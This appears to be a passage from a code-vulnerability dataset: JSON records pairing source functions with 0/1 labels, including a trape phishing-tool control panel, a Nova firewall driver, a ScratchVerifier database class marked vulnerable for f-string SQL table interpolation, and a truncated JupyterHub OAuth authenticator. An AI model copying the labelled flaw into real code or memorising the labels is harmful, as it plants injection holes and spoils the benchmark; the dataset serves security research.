{"idx": 969, "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#**\n#\n#########\n# trape #\n#########\n#\n# trape depends of this file\n# For full copyright information this visit: https://github.com/boxug/trape\n#\n# Copyright 2017 by boxug / <hey@boxug.com>\n#**\nimport urllib2\nfrom flask import Flask, render_template, session, request, json\nfrom core.trape import Trape\nfrom core.db import Database\n\n# Main parts, to generate relationships among others\ntrape = Trape()\napp = Flask(__name__, template_folder='../templates', static_folder='../static')\n\n# call database\ndb = Database()\n\n# preview header tool in console\ntrape.header()\n\n@app.route(\"/\" + trape.stats_path)\ndef index():\n    return render_template(\"/login.html\")\n\n@app.route(\"/logout\")\ndef logout():\n    return render_template(\"/login.html\")\n\n@app.route(\"/login\", methods=[\"POST\"])\ndef login():\n    id = request.form['id']\n    if id == trape.stats_key:\n        return json.dumps({'status':'OK', 'path' : trape.home_path, 'victim_path' : trape.victim_path, 'url_to_clone' : trape.url_to_clone, 'app_port' : trape.app_port, 'date_start' : trape.date_start, 'user_ip' : '127.0.0.1'});\n    else:\n      return json.dumps({'status':'NOPE', 'path' : '/'});\n\n@app.route(\"/get_data\", methods=[\"POST\"])\ndef home_get_dat():\n    d = db.sentences_stats('get_data')\n    n = db.sentences_stats('all_networks')\n\n    rows = db.sentences_stats('get_clicks')\n    c = rows[0][0]\n    rows = db.sentences_stats('get_sessions')\n    s = rows[0][0]\n    vId = ('online', )\n    rows = db.sentences_stats('get_online', vId)\n    o = rows[0][0]\n\n    return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o});\n\n@app.route(\"/get_preview\", methods=[\"POST\"])\ndef home_get_preview():\n    vId = request.form['vId']\n    t = (vId,)\n    d = db.sentences_stats('get_preview', t)\n    n = db.sentences_stats('id_networks', t)\n    return json.dumps({'status' : 'OK', 'vId' : vId, 'd' : d, 'n' : n});\n\n@app.route(\"/get_title\", methods=[\"POST\"])\ndef home_get_title():\n    opener = urllib2.build_opener()\n    html = opener.open(trape.url_to_clone).read()\n    html = html[html.find('<title>') + 7 : html.find('</title>')]\n    return json.dumps({'status' : 'OK', 'title' : html});\n\n@app.route(\"/get_requests\", methods=[\"POST\"])\ndef home_get_requests():\n    d = db.sentences_stats('get_requests')\n\n    return json.dumps({'status' : 'OK', 'd' : d});", "target": 0}
{"idx": 970, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2011 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n# Copyright (c) 2011 Citrix Systems, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nfrom nova import context\nfrom nova import db\nfrom nova import flags\nfrom nova import log as logging\nfrom nova.openstack.common import cfg\nfrom nova import utils\nfrom nova.virt import netutils\n\n\nLOG = logging.getLogger(__name__)\n\nallow_same_net_traffic_opt = cfg.BoolOpt('allow_same_net_traffic',\n        default=True,\n        help='Whether to allow network traffic from same network')\n\nFLAGS = flags.FLAGS\nFLAGS.register_opt(allow_same_net_traffic_opt)\n\n\nclass FirewallDriver(object):\n    \"\"\" Firewall Driver base class.\n\n        Defines methods that any driver providing security groups\n        and provider fireall functionality should implement.\n    \"\"\"\n    def prepare_instance_filter(self, instance, network_info):\n        \"\"\"Prepare filters for the instance.\n        At this point, the instance isn't running yet.\"\"\"\n        raise NotImplementedError()\n\n    def unfilter_instance(self, instance, network_info):\n        \"\"\"Stop filtering instance\"\"\"\n        raise NotImplementedError()\n\n    def apply_instance_filter(self, instance, network_info):\n        \"\"\"Apply instance filter.\n\n        Once this method returns, the instance should be firewalled\n        appropriately. This method should as far as possible be a\n        no-op. It's vastly preferred to get everything set up in\n        prepare_instance_filter.\n        \"\"\"\n        raise NotImplementedError()\n\n    def refresh_security_group_rules(self, security_group_id):\n        \"\"\"Refresh security group rules from data store\n\n        Gets called when a rule has been added to or removed from\n        the security group.\"\"\"\n        raise NotImplementedError()\n\n    def refresh_security_group_members(self, security_group_id):\n        \"\"\"Refresh security group members from data store\n\n        Gets called when an instance gets added to or removed from\n        the security group.\"\"\"\n        raise NotImplementedError()\n\n    def refresh_provider_fw_rules(self):\n        \"\"\"Refresh common rules for all hosts/instances from data store.\n\n        Gets called when a rule has been added to or removed from\n        the list of rules (via admin api).\n\n        \"\"\"\n        raise NotImplementedError()\n\n    def setup_basic_filtering(self, instance, network_info):\n        \"\"\"Create rules to block spoofing and allow dhcp.\n\n        This gets called when spawning an instance, before\n        :py:meth:`prepare_instance_filter`.\n\n        \"\"\"\n        raise NotImplementedError()\n\n    def instance_filter_exists(self, instance, network_info):\n        \"\"\"Check nova-instance-instance-xxx exists\"\"\"\n        raise NotImplementedError()\n\n\nclass IptablesFirewallDriver(FirewallDriver):\n    \"\"\"Driver which enforces security groups through iptables rules.\"\"\"\n\n    def __init__(self, **kwargs):\n        from nova.network import linux_net\n        self.iptables = linux_net.iptables_manager\n        self.instances = {}\n        self.network_infos = {}\n        self.basicly_filtered = False\n\n        self.iptables.ipv4['filter'].add_chain('sg-fallback')\n        self.iptables.ipv4['filter'].add_rule('sg-fallback', '-j DROP')\n        self.iptables.ipv6['filter'].add_chain('sg-fallback')\n        self.iptables.ipv6['filter'].add_rule('sg-fallback', '-j DROP')\n\n    def setup_basic_filtering(self, instance, network_info):\n        pass\n\n    def apply_instance_filter(self, instance, network_info):\n        \"\"\"No-op. Everything is done in prepare_instance_filter.\"\"\"\n        pass\n\n    def unfilter_instance(self, instance, network_info):\n        if self.instances.pop(instance['id'], None):\n            # NOTE(vish): use the passed info instead of the stored info\n            self.network_infos.pop(instance['id'])\n            self.remove_filters_for_instance(instance)\n            self.iptables.apply()\n        else:\n            LOG.info(_('Attempted to unfilter instance %s which is not '\n                     'filtered'), instance['id'])\n\n    def prepare_instance_filter(self, instance, network_info):\n        self.instances[instance['id']] = instance\n        self.network_infos[instance['id']] = network_info\n        self.add_filters_for_instance(instance)\n        LOG.debug(_('Filters added to instance %s'), instance['uuid'])\n        self.refresh_provider_fw_rules()\n        LOG.debug(_('Provider Firewall Rules refreshed'))\n        self.iptables.apply()\n\n    def _create_filter(self, ips, chain_name):\n        return ['-d %s -j $%s' % (ip, chain_name) for ip in ips]\n\n    def _filters_for_instance(self, chain_name, network_info):\n        \"\"\"Creates a rule corresponding to each ip that defines a\n             jump to the corresponding instance - chain for all the traffic\n             destined to that ip.\"\"\"\n        ips_v4 = [ip['ip'] for (_n, mapping) in network_info\n                 for ip in mapping['ips']]\n        ipv4_rules = self._create_filter(ips_v4, chain_name)\n\n        ipv6_rules = []\n        if FLAGS.use_ipv6:\n            ips_v6 = [ip['ip'] for (_n, mapping) in network_info\n                     for ip in mapping['ip6s']]\n            ipv6_rules = self._create_filter(ips_v6, chain_name)\n\n        return ipv4_rules, ipv6_rules\n\n    def _add_filters(self, chain_name, ipv4_rules, ipv6_rules):\n        for rule in ipv4_rules:\n            self.iptables.ipv4['filter'].add_rule(chain_name, rule)\n\n        if FLAGS.use_ipv6:\n            for rule in ipv6_rules:\n                self.iptables.ipv6['filter'].add_rule(chain_name, rule)\n\n    def add_filters_for_instance(self, instance):\n        network_info = self.network_infos[instance['id']]\n        chain_name = self._instance_chain_name(instance)\n        if FLAGS.use_ipv6:\n            self.iptables.ipv6['filter'].add_chain(chain_name)\n        self.iptables.ipv4['filter'].add_chain(chain_name)\n        ipv4_rules, ipv6_rules = self._filters_for_instance(chain_name,\n                                                            network_info)\n        self._add_filters('local', ipv4_rules, ipv6_rules)\n        ipv4_rules, ipv6_rules = self.instance_rules(instance, network_info)\n        self._add_filters(chain_name, ipv4_rules, ipv6_rules)\n\n    def remove_filters_for_instance(self, instance):\n        chain_name = self._instance_chain_name(instance)\n\n        self.iptables.ipv4['filter'].remove_chain(chain_name)\n        if FLAGS.use_ipv6:\n            self.iptables.ipv6['filter'].remove_chain(chain_name)\n\n    @staticmethod\n    def _security_group_chain_name(security_group_id):\n        return 'nova-sg-%s' % (security_group_id,)\n\n    def _instance_chain_name(self, instance):\n        return 'inst-%s' % (instance['id'],)\n\n    def _do_basic_rules(self, ipv4_rules, ipv6_rules, network_info):\n        # Always drop invalid packets\n        ipv4_rules += ['-m state --state ' 'INVALID -j DROP']\n        ipv6_rules += ['-m state --state ' 'INVALID -j DROP']\n\n        # Allow established connections\n        ipv4_rules += ['-m state --state ESTABLISHED,RELATED -j ACCEPT']\n        ipv6_rules += ['-m state --state ESTABLISHED,RELATED -j ACCEPT']\n\n        # Pass through provider-wide drops\n        ipv4_rules += ['-j $provider']\n        ipv6_rules += ['-j $provider']\n\n    def _do_dhcp_rules(self, ipv4_rules, network_info):\n        dhcp_servers = [info['dhcp_server'] for (_n, info) in network_info]\n\n        for dhcp_server in dhcp_servers:\n            ipv4_rules.append('-s %s -p udp --sport 67 --dport 68 '\n                              '-j ACCEPT' % (dhcp_server,))\n\n    def _do_project_network_rules(self, ipv4_rules, ipv6_rules, network_info):\n        cidrs = [network['cidr'] for (network, _i) in network_info]\n        for cidr in cidrs:\n            ipv4_rules.append('-s %s -j ACCEPT' % (cidr,))\n        if FLAGS.use_ipv6:\n            cidrv6s = [network['cidr_v6'] for (network, _i) in\n                       network_info]\n\n            for cidrv6 in cidrv6s:\n                ipv6_rules.append('-s %s -j ACCEPT' % (cidrv6,))\n\n    def _do_ra_rules(self, ipv6_rules, network_info):\n        gateways_v6 = [mapping['gateway_v6'] for (_n, mapping) in\n                       network_info]\n        for gateway_v6 in gateways_v6:\n            ipv6_rules.append(\n                    '-s %s/128 -p icmpv6 -j ACCEPT' % (gateway_v6,))\n\n    def _build_icmp_rule(self, rule, version):\n        icmp_type = rule.from_port\n        icmp_code = rule.to_port\n\n        if icmp_type == -1:\n            icmp_type_arg = None\n        else:\n            icmp_type_arg = '%s' % icmp_type\n            if not icmp_code == -1:\n                icmp_type_arg += '/%s' % icmp_code\n\n        if icmp_type_arg:\n            if version == 4:\n                return ['-m', 'icmp', '--icmp-type', icmp_type_arg]\n            elif version == 6:\n                return ['-m', 'icmp6', '--icmpv6-type', icmp_type_arg]\n        # return empty list if icmp_type == -1\n        return []\n\n    def _build_tcp_udp_rule(self, rule, version):\n        if rule.from_port == rule.to_port:\n            return ['--dport', '%s' % (rule.from_port,)]\n        else:\n            return ['-m', 'multiport',\n                    '--dports', '%s:%s' % (rule.from_port,\n                                           rule.to_port)]\n\n    def instance_rules(self, instance, network_info):\n        ctxt = context.get_admin_context()\n\n        ipv4_rules = []\n        ipv6_rules = []\n\n        # Initialize with basic rules\n        self._do_basic_rules(ipv4_rules, ipv6_rules, network_info)\n        # Set up rules to allow traffic to/from DHCP server\n        self._do_dhcp_rules(ipv4_rules, network_info)\n\n        #Allow project network traffic\n        if FLAGS.allow_same_net_traffic:\n            self._do_project_network_rules(ipv4_rules, ipv6_rules,\n                                           network_info)\n        # We wrap these in FLAGS.use_ipv6 because they might cause\n        # a DB lookup. The other ones are just list operations, so\n        # they're not worth the clutter.\n        if FLAGS.use_ipv6:\n            # Allow RA responses\n            self._do_ra_rules(ipv6_rules, network_info)\n\n        security_groups = db.security_group_get_by_instance(ctxt,\n                                                            instance['id'])\n\n        # then, security group chains and rules\n        for security_group in security_groups:\n            rules = db.security_group_rule_get_by_security_group(ctxt,\n                                                          security_group['id'])\n\n            for rule in rules:\n                LOG.debug(_('Adding security group rule: %r'), rule)\n\n                if not rule.cidr:\n                    version = 4\n                else:\n                    version = netutils.get_ip_version(rule.cidr)\n\n                if version == 4:\n                    fw_rules = ipv4_rules\n                else:\n                    fw_rules = ipv6_rules\n\n                protocol = rule.protocol.lower()\n                if version == 6 and protocol == 'icmp':\n                    protocol = 'icmpv6'\n\n                args = ['-j ACCEPT']\n                if protocol:\n                    args += ['-p', protocol]\n\n                if protocol in ['udp', 'tcp']:\n                    args += self._build_tcp_udp_rule(rule, version)\n                elif protocol == 'icmp':\n                    args += self._build_icmp_rule(rule, version)\n                if rule.cidr:\n                    LOG.info('Using cidr %r', rule.cidr)\n                    args += ['-s', rule.cidr]\n                    fw_rules += [' '.join(args)]\n                else:\n                    if rule['grantee_group']:\n                        # FIXME(jkoelker) This needs to be ported up into\n                        #                 the compute manager which already\n                        #                 has access to a nw_api handle,\n                        #                 and should be the only one making\n                        #                 making rpc calls.\n                        import nova.network\n                        nw_api = nova.network.API()\n                        for instance in rule['grantee_group']['instances']:\n                            LOG.info('instance: %r', instance)\n                            nw_info = nw_api.get_instance_nw_info(ctxt,\n                                                                  instance)\n\n                            ips = [ip['address']\n                                for ip in nw_info.fixed_ips()\n                                    if ip['version'] == version]\n\n                            LOG.info('ips: %r', ips)\n                            for ip in ips:\n                                subrule = args + ['-s %s' % ip]\n                                fw_rules += [' '.join(subrule)]\n\n                LOG.info('Using fw_rules: %r', fw_rules)\n        ipv4_rules += ['-j $sg-fallback']\n        ipv6_rules += ['-j $sg-fallback']\n\n        return ipv4_rules, ipv6_rules\n\n    def instance_filter_exists(self, instance, network_info):\n        pass\n\n    def refresh_security_group_members(self, security_group):\n        self.do_refresh_security_group_rules(security_group)\n        self.iptables.apply()\n\n    def refresh_security_group_rules(self, security_group):\n        self.do_refresh_security_group_rules(security_group)\n        self.iptables.apply()\n\n    @utils.synchronized('iptables', external=True)\n    def do_refresh_security_group_rules(self, security_group):\n        for instance in self.instances.values():\n            self.remove_filters_for_instance(instance)\n            self.add_filters_for_instance(instance)\n\n    def refresh_provider_fw_rules(self):\n        \"\"\"See :class:`FirewallDriver` docs.\"\"\"\n        self._do_refresh_provider_fw_rules()\n        self.iptables.apply()\n\n    @utils.synchronized('iptables', external=True)\n    def _do_refresh_provider_fw_rules(self):\n        \"\"\"Internal, synchronized version of refresh_provider_fw_rules.\"\"\"\n        self._purge_provider_fw_rules()\n        self._build_provider_fw_rules()\n\n    def _purge_provider_fw_rules(self):\n        \"\"\"Remove all rules from the provider chains.\"\"\"\n        self.iptables.ipv4['filter'].empty_chain('provider')\n        if FLAGS.use_ipv6:\n            self.iptables.ipv6['filter'].empty_chain('provider')\n\n    def _build_provider_fw_rules(self):\n        \"\"\"Create all rules for the provider IP DROPs.\"\"\"\n        self.iptables.ipv4['filter'].add_chain('provider')\n        if FLAGS.use_ipv6:\n            self.iptables.ipv6['filter'].add_chain('provider')\n        ipv4_rules, ipv6_rules = self._provider_rules()\n        for rule in ipv4_rules:\n            self.iptables.ipv4['filter'].add_rule('provider', rule)\n\n        if FLAGS.use_ipv6:\n            for rule in ipv6_rules:\n                self.iptables.ipv6['filter'].add_rule('provider', rule)\n\n    @staticmethod\n    def _provider_rules():\n        \"\"\"Generate a list of rules from provider for IP4 & IP6.\"\"\"\n        ctxt = context.get_admin_context()\n        ipv4_rules = []\n        ipv6_rules = []\n        rules = db.provider_fw_rule_get_all(ctxt)\n        for rule in rules:\n            LOG.debug(_('Adding provider rule: %s'), rule['cidr'])\n            version = netutils.get_ip_version(rule['cidr'])\n            if version == 4:\n                fw_rules = ipv4_rules\n            else:\n                fw_rules = ipv6_rules\n\n            protocol = rule['protocol']\n            if version == 6 and protocol == 'icmp':\n                protocol = 'icmpv6'\n\n            args = ['-p', protocol, '-s', rule['cidr']]\n\n            if protocol in ['udp', 'tcp']:\n                if rule['from_port'] == rule['to_port']:\n                    args += ['--dport', '%s' % (rule['from_port'],)]\n                else:\n                    args += ['-m', 'multiport',\n                             '--dports', '%s:%s' % (rule['from_port'],\n                                                    rule['to_port'])]\n            elif protocol == 'icmp':\n                icmp_type = rule['from_port']\n                icmp_code = rule['to_port']\n\n                if icmp_type == -1:\n                    icmp_type_arg = None\n                else:\n                    icmp_type_arg = '%s' % icmp_type\n                    if not icmp_code == -1:\n                        icmp_type_arg += '/%s' % icmp_code\n\n                if icmp_type_arg:\n                    if version == 4:\n                        args += ['-m', 'icmp', '--icmp-type',\n                                 icmp_type_arg]\n                    elif version == 6:\n                        args += ['-m', 'icmp6', '--icmpv6-type',\n                                 icmp_type_arg]\n            args += ['-j DROP']\n            fw_rules += [' '.join(args)]\n        return ipv4_rules, ipv6_rules\n\n\nclass NoopFirewallDriver(object):\n    \"\"\"Firewall driver which just provides No-op methods.\"\"\"\n    def __init__(*args, **kwargs):\n        pass\n\n    def _noop(*args, **kwargs):\n        pass\n\n    def __getattr__(self, key):\n        return self._noop\n\n    def instance_filter_exists(self, instance, network_info):\n        return True\n", "target": 0}
{"idx": 971, "func": "import os\nimport time\nimport json\nfrom secrets import token_bytes, token_hex, randbits\nfrom hashlib import sha256\nimport asyncio\nimport aiosqlite as sql\nfrom responses import *\n\nclass Database:\n    def __init__(self, session):\n        loop = asyncio.get_event_loop()\n        # lock to prevent race conditions when SELECT then fetchone\n        self.lock = asyncio.Lock(loop=loop)\n        self.dbw = loop.run_until_complete(sql.connect(DATABASE_FILENAME))\n        self.dbw.row_factory = sql.Row\n        self.db = loop.run_until_complete(self.dbw.cursor())\n        with open(os.path.join(os.path.dirname(__file__), 'sql',\n                               'startup.sql')) as startup:\n            loop.run_until_complete(self.db.executescript(startup.read()))\n        self.session = session\n\n    async def close(self):\n        await self.dbw.commit()\n        await self.dbw.close()\n\n    ### TABLE: clients ###\n\n    async def client_matches(self, client_id, token):\n        async with self.lock:\n            await self.db.execute('SELECT client_id FROM scratchverifier_clients \\\nWHERE client_id=? AND token=?', (client_id, token))\n            if (await self.db.fetchone()):\n                return True\n        return False\n\n    ### TABLE: clients and sessions ###\n\n    async def username_from_session(self, session_id):\n        if session_id == 0: # 0 means debug mode\n            return 'kenny2scratch'\n        async with self.lock:\n            await self.db.execute('SELECT username FROM scratchverifier_sessions \\\nWHERE session_id=?', (session_id,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        return row[0]\n\n    async def new_client(self, session_id):\n        if session_id == 0: # 0 means debug mode\n            # don't create a client, because other funcs return a dummy one\n            # when under debug mode\n            return {'client_id': 0, 'username': 'kenny2scratch',\n                    'token': 'This client is newly created.'}\n        username = await self.username_from_session(session_id)\n        if username is None:\n            return None\n        async with self.session.get(USERS_API.format(username)) as resp:\n            assert resp.status == 200\n            data = await resp.json()\n        client_id = data['id']\n        token = token_hex(32)\n        await self.db.execute('INSERT INTO scratchverifier_clients (client_id, \\\ntoken, username) VALUES (?, ?, ?)', (client_id, token, username))\n        return {'client_id': client_id, 'token': token, 'username': username}\n\n    async def get_client(self, session_id):\n        if session_id == 0: # 0 means debug mode\n            return {'client_id': 0, 'username': 'kenny2scratch',\n                    'token': 'This is an example token that can be censored.'}\n        username = await self.username_from_session(session_id)\n        if username is None:\n            return None\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_clients \\\nWHERE username=?', (username,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        return dict(row)\n\n    async def get_client_info(self, client_id):\n        if client_id == 0: # 0 means debug mode\n            return {'client_id': 0, 'username': 'kenny2scratch',\n                    'token': 'This is an example token that can be censored.'}\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_clients \\\nWHERE client_id=?', (client_id,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        return dict(row)\n\n    async def reset_token(self, session_id):\n        if session_id == 0: # 0 means debug mode\n            return {'client_id': 0, 'username': 'kenny2scratch',\n                    'token': 'Yes, the token was reset.'}\n        username = await self.username_from_session(session_id)\n        if username is None:\n            return None\n        await self.db.execute('UPDATE scratchverifier_clients SET token=? \\\nWHERE username=?', (token_hex(32), username))\n        return self.get_client(session_id)\n\n    async def del_client(self, session_id):\n        if session_id == 0: # 0 means debug mode\n            return\n        username = await self.username_from_session(session_id)\n        if username is None:\n            return\n        await self.db.execute('DELETE FROM scratchverifier_clients \\\nWHERE username=?', (username,))\n\n    ### TABLE: sessions ###\n\n    async def new_session(self, username):\n        while 1:\n            session_id = randbits(32)\n            async with self.lock:\n                await self.db.execute('SELECT session_id FROM \\\nscratchverifier_sessions WHERE session_id=?', (session_id,))\n                if (await self.db.fetchone()) is None:\n                    break\n        await self.db.execute('INSERT INTO scratchverifier_sessions \\\n(session_id, expiry, username) VALUES (?, ?, ?)', (\n            session_id,\n            int(time.time()) + SESSION_EXPIRY,\n            username\n        ))\n        await self.db.execute('DELETE FROM scratchverifier_sessions WHERE \\\nexpiry<=?', (int(time.time()),))\n        return session_id\n\n    async def get_expired(self, session_id):\n        async with self.lock:\n            await self.db.execute('SELECT expiry FROM scratchverifier_sessions \\\nWHERE session_id=?', (session_id,))\n            expiry = await self.db.fetchone()\n        if expiry is None:\n            # \"expired\" if session doesn't exist in the first place\n            return True\n        expiry = expiry[0]\n        if time.time() > expiry:\n            await self.db.execute('DELETE FROM scratchverifier_sessions \\\nWHERE session_id=?', (session_id,))\n            return True\n        return False\n\n    async def logout(self, session_id):\n        await self.db.execute('DELETE FROM scratchverifier_sessions \\\nWHERE session_id=?', (session_id,))\n\n    async def logout_user(self, username):\n        await self.db.execute('DELETE FROM scratchverifier_sessions \\\nWHERE username=?', (username,))\n\n    ### TABLE: usage ###\n\n    async def start_verification(self, client_id, username):\n        async with self.lock:\n            await self.db.execute('SELECT code FROM scratchverifier_usage WHERE \\\nclient_id=? AND username=?', (client_id, username))\n            row = await self.db.fetchone()\n        if row is not None:\n            await self.db.execute('UPDATE scratchverifier_usage SET expiry=? \\\nWHERE client_id=? AND username=? AND code=?', (int(time.time()) + VERIFY_EXPIRY,\n                                               client_id, username, row[0]))\n            return row[0]\n        code = sha256(\n            str(client_id).encode()\n            + str(time.time()).encode()\n            + username.encode()\n            + token_bytes()\n        # 0->A, 1->B, etc, to avoid Scratch's phone number censor\n        ).hexdigest().translate({ord('0') + i: ord('A') + i for i in range(10)})\n        await self.db.execute('INSERT INTO scratchverifier_usage (client_id, \\\ncode, username, expiry) VALUES (?, ?, ?, ?)', (client_id, code, username,\n                               int(time.time() + VERIFY_EXPIRY)))\n        await self.db.execute('INSERT INTO scratchverifier_logs (client_id, \\\nusername, log_time, log_type) VALUES (?, ?, ?, ?)', (client_id, username,\n                                                     int(time.time()), 1))\n        await self.db.execute('DELETE FROM scratchverifier_usage WHERE \\\nexpiry<=?', (int(time.time()),))\n        return code\n\n    async def get_code(self, client_id, username):\n        async with self.lock:\n            await self.db.execute('SELECT code, expiry FROM scratchverifier_usage \\\nWHERE client_id=? AND username=?', (client_id, username))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        if time.time() > row['expiry']:\n            await self.end_verification(client_id, username, False)\n            return None\n        return row['code']\n\n    async def end_verification(self, client_id, username, succ=True):\n        await self.db.execute('DELETE FROM scratchverifier_usage WHERE \\\nclient_id=? AND username=?', (client_id, username))\n        await self.db.execute('INSERT INTO scratchverifier_logs (client_id, \\\nusername, log_time, log_type) \\\nVALUES (?, ?, ?, ?)', (client_id, username, int(time.time()), 3 - succ))\n\n    ### TABLE: logs solely ###\n\n    async def get_logs(self, table='logs', **params):\n        query = f'SELECT * FROM scratchverifier_{table} WHERE 1=1'\n        id_col = 'log_id' if table == 'logs' else 'id'\n        time_col = 'log_time' if table == 'logs' else 'time'\n        type_col = 'log_type' if table == 'logs' else 'type'\n        if 'start' in params:\n            query += f' AND {id_col}<:start'\n        if 'before' in params:\n            query += f' AND {time_col}<=:before'\n        if 'end' in params:\n            query += f' AND {id_col}>:end'\n        if 'after' in params:\n            query += f' AND {time_col}>=:after'\n        if 'client_id' in params:\n            query += ' AND client_id=:client_id'\n        if 'username' in params:\n            query += ' AND username=:username'\n        if 'type' in params:\n            query += f' AND {type_col}=:type'\n        query += f' ORDER BY {id_col} DESC LIMIT :limit'\n        for k, v in params.items():\n            if k in {'start', 'before', 'end', 'after', 'client_id', 'type'}:\n                params[k] = int(v)\n        params['limit'] = int(params['limit'])\n        async with self.lock:\n            await self.db.execute(query, params)\n            rows = await self.db.fetchall()\n        return [dict(i) for i in rows]\n\n    async def get_log(self, log_id, table='logs'):\n        id_col = 'log_id' if table == 'logs' else 'id'\n        async with self.lock:\n            await self.db.execute(f'SELECT * FROM scratchverifier_{table} \\\nWHERE {id_col}=?', (log_id,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        return dict(row)\n\n    ### TABLE: ratelimits ###\n\n    async def get_ratelimits(self):\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_ratelimits')\n            rows = await self.db.fetchall()\n        return [dict(i) for i in rows]\n\n    async def get_ratelimit(self, username):\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_ratelimits \\\nWHERE username=?', (username,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        return row\n\n    async def set_ratelimits(self, data, performer):\n        await self.db.executemany('INSERT OR REPLACE INTO \\\nscratchverifier_ratelimits (username, ratelimit) \\\nVALUES (:username, :ratelimit)', data)\n        if performer is not None:\n            await self.db.executemany(\n                'INSERT INTO scratchverifier_auditlogs \\\n    (username, time, type, data) VALUES \\\n    (:username, :time, :type, :data)',\n                ({\n                    'username': performer,\n                    'time': int(time.time()),\n                    'type': 2, # ratelimit update\n                    'data': json.dumps(i)\n                } for i in data)\n            )\n\n    ### TABLE: bans ###\n\n    async def get_bans(self):\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_bans')\n            rows = await self.db.fetchall()\n        return [dict(i) for i in rows]\n\n    async def get_ban(self, username):\n        async with self.lock:\n            await self.db.execute('SELECT * FROM scratchverifier_bans \\\nWHERE username=?', (username,))\n            row = await self.db.fetchone()\n        if row is None:\n            return None\n        if row['expiry'] is not None and row['expiry'] < time.time():\n            # ban has expired, delete it and return no ban\n            await self.db.execute('DELETE FROM scratchverifier_bans \\\nWHERE username=?', (username,))\n            return None\n        return row\n\n    async def set_bans(self, data, performer):\n        await self.db.executemany('INSERT OR REPLACE INTO scratchverifier_bans \\\n(username, expiry) VALUES (:username, :expiry)', data)\n        await self.db.executemany('DELETE FROM scratchverifier_clients \\\nWHERE username=?', ((i['username'],) for i in data))\n        await self.db.executemany('DELETE FROM scratchverifier_sessions \\\nWHERE username=?', ((i['username'],) for i in data))\n        await self.db.executemany(\n            'INSERT INTO scratchverifier_auditlogs \\\n(username, time, type, data) VALUES \\\n(:username, :time, :type, :data)',\n            ({\n                'username': performer,\n                'time': int(time.time()),\n                'type': 1, # ban\n                'data': json.dumps(i)\n            } for i in data)\n        )\n\n    async def del_ban(self, username, performer):\n        await self.db.execute('DELETE FROM scratchverifier_bans \\\nWHERE username=?', (username,))\n        await self.db.execute(\n            'INSERT INTO scratchverifier_auditlogs \\\n(username, time, type, data) VALUES \\\n(:username, :time, :type, :data)',\n            {\n                'username': performer,\n                'time': int(time.time()),\n                'type': 3, # unban\n                'data': json.dumps({'username': username})\n            }\n        )\n", "target": 1}
{"idx": 972, "func": "\"\"\"\nAuthenticator to use GitHub OAuth with JupyterHub\n\"\"\"\n\n\nimport json\nimport os\nimport re\nimport string\nimport warnings\n\nfrom tornado.auth import OAuth2Mixin\nfrom tornado import web\n\nfrom tornado.httputil import url_concat\nfrom tornado.httpclient import HTTPRequest, AsyncHTTPClient, HTTPError\n\nfrom jupyterhub.auth import LocalAuthenticator\n\nfrom traitlets import List, Set, Unicode, default, observe\n\nfrom .common import next_page_from_links\nfrom .oauth2 import OAuthLoginHandler, OAuthenticator\n\n\ndef _api_headers(access_token):\n    return {\n        \"Accept\": \"application/json\",\n        \"User-Agent\": \"JupyterHub\",\n        \"Authorization\": \"token {}\".format(access_token),\n    }\n\n\nclass GitHubOAuthenticator(OAuthenticator):\n\n    # see github_scopes.md for details about scope config\n    # set scopes via config, e.g.\n    # c.GitHubOAuthenticator.scope = ['read:org']\n\n    _deprecated_aliases = {\n        \"github_organization_whitelist\": (\"allowed_organizations\", \"0.12.0\"),\n    }\n\n    @observe(*list(_deprecated_aliases))\n    def _deprecated_trait(self, change):\n        super()._deprecated_trait(change)\n\n    login_service = \"GitHub\"\n\n    github_url = Unicode(\"https://github.com\", config=True)\n\n    @default(\"github_url\")\n    def _github_url_default(self):\n        github_url = os.environ.get(\"GITHUB_URL\")\n        if not github_url:\n            # fallback on older GITHUB_HOST config,\n            # treated the same as GITHUB_URL\n            host = os.environ.get(\"GITHUB_HOST\")\n            if host:\n                if os.environ.get(\"GITHUB_HTTP\"):\n                    protocol = \"http\"\n                    warnings.warn(\n                        'Use of GITHUB_HOST with GITHUB_HTTP might be deprecated in the future. '\n                        'Use GITHUB_URL=http://{} to set host and protocol together.'.format(\n                            host\n                        ),\n                        PendingDeprecationWarning,\n                    )\n                else:\n                    protocol = \"https\"\n                github_url = \"{}://{}\".format(protocol, host)\n\n        if github_url:\n            if '://' not in github_url:\n                # ensure protocol is included, assume https if missing\n                github_url = 'https://' + github_url\n\n            return github_url\n        else:\n            # nothing specified, this is the true default\n            github_url = \"https://github.com\"\n\n        # ensure no trailing slash\n        return github_url.rstrip(\"/\")\n\n    github_api = Unicode(\"https://api.github.com\", config=True)\n\n    @default(\"github_api\")\n    def _github_api_default(self):\n        if self.github_url == \"https://github.com\":\n            return \"https://api.github.com\"\n        else:\n            return self.github_url + \"/api/v3\"\n\n    @default(\"authorize_url\")\n    def _authorize_url_default(self):\n        return \"%s/login/oauth/authorize\" % (self.github_url)\n\n    @default(\"token_url\")\n    def _token_url_default(self):\n        return \"%s/login/oauth/access_token\" % (self.github_url)\n\n    # deprecated names\n    github_client_id = Unicode(config=True, help=\"DEPRECATED\")\n\n    def _github_client_id_changed(self, name, old, new):\n        